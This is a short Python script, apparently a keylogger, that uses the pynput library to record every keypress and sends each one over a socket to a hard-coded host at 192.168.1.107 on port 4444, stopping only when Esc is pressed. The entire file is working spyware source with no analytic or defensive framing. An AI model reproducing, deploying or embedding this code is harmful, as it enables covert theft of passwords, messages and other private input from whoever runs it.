import pynput
from pynput.keyboard import Listener, Key
import socket

host = '192.168.1.107' #Ip Host
port = 4444 #Port Host

#Create connection
s = socket.socket()
s.connect((host, port))

#keyboard recording
def press(key):
    #print(key)
    s.send(str(key).encode())

#Stop
def release(key):
    if key == Key.esc:
        return False

#Verify keyboard
with Listener(on_press = press, on_release = release) as listener:
    listener.join()
